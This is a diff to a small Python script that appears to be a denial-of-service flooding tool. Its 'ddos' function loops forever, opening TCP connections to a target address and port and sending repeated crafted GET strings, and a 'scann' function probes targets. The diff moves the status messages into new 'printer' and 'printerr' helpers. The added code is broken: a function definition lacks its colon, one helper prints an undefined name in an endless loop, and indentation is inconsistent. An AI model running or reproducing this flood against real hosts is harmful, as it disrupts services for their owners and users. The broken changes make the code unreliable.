@@ -9,6 +9,15 @@ messages = 'hello its me'
 threads = 12
 rtxt = 1
 
+def printerr():
+   while True:
+      print(printe)
+      time.sleep(1)
+   
+def printer(ala)
+   printe = ("\033[1;32;40m\n" + ala + "\n")
+   
+   
 def scann(targetIP):
    print(" ")
    try:
@@ -28,18 +37,21 @@ def scann(targetIP):
    
 def ddos():
    
-   
+   printerr()
    message = (messages * rtxt)
-   print("\033[1;32;40m\nOk!")
+   lkfj = "Ok!"
+   printer(lkfj)
    while True:
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
           mysocket.connect((ip, port))
           mysocket.send(str.encode("GET " + message + "HTTP/1.1 \r\n"))
           mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
-          print("\033[1;32;40mSuccess!\n")
+          lkfj = "Success!"
+          printer(lkfj)
       except socket.error:
-         print("\033[1;31;40m\nFailed Connection killed!, please wait....\n")
+            lkfj = "Failed! Retry..."
+            printer(lkfj)
          
          mysocket.close()
 
